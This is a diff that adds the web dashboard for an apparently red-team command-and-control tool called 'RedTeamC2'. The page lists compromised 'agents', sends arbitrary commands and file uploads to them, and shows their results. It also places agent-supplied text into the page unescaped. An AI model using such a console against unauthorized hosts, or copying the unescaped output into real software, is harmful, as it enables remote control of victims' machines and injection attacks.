@@ -1,3 +1,67 @@
 <!-- index.html
 Main dashboard template for RedTeamC2 Web UI
 -->
+
+<!DOCTYPE html>
+<html>
+<head>
+    <title>RedTeamC2 Web UI</title>
+    <script src="https://cdn.socket.io/4.4.1/socket.io.min.js"></script>
+    <style>
+        body { font-family: Arial; }
+        .agent { border: 1px solid #ccc; margin: 10px; padding: 10px; }
+        .result { background: #f9f9f9; margin: 5px; padding: 5px; }
+    </style>
+</head>
+<body>
+    <h1>RedTeamC2 Web UI</h1>
+    <div id="agents"></div>
+    <script>
+        const socket = io();
+        function renderAgents(agents) {
+            let html = '';
+            for (const agent of agents) {
+                html += `<div class='agent'>
+                    <b>ID:</b> ${agent.id}<br>
+                    <b>Sysinfo:</b> ${agent.sysinfo}<br>
+                    <b>Last Seen:</b> ${new Date(agent.last_seen*1000).toLocaleString()}<br>
+                    <form onsubmit="sendTask(event, '${agent.id}')">
+                        <input type='text' name='cmd' placeholder='Command'/>
+                        <button type='submit'>Send Task</button>
+                    </form>
+                    <form enctype='multipart/form-data' onsubmit="uploadFile(event, '${agent.id}')">
+                        <input type='file' name='file'/>
+                        <button type='submit'>Upload File</button>
+                    </form>
+                    <button onclick="showResults('${agent.id}')">Show Results</button>
+                    <div id='results-${agent.id}'></div>
+                </div>`;
+            }
+            document.getElementById('agents').innerHTML = html;
+        }
+        function sendTask(e, agent_id) {
+            e.preventDefault();
+            const cmd = e.target.cmd.value;
+            fetch('/api/task', {method:'POST', body: new URLSearchParams({agent_id, cmd})});
+            alert('Task sent!');
+        }
+        function uploadFile(e, agent_id) {
+            e.preventDefault();
+            const form = new FormData(e.target);
+            form.append('agent_id', agent_id);
+            fetch('/api/upload', {method:'POST', body: form});
+            alert('File uploaded!');
+        }
+        function showResults(agent_id) {
+            fetch(`/api/results/${agent_id}`).then(r=>r.json()).then(results=>{
+                let html = '';
+                for (const res of results) html += `<div class='result'>${res}</div>`;
+                document.getElementById('results-'+agent_id).innerHTML = html;
+            });
+        }
+        socket.on('agent_update', data => renderAgents(data.agents));
+        socket.on('result_update', data => showResults(data.agent_id));
+        fetch('/api/agents').then(r=>r.json()).then(renderAgents);
+    </script>
+</body>
+</html>
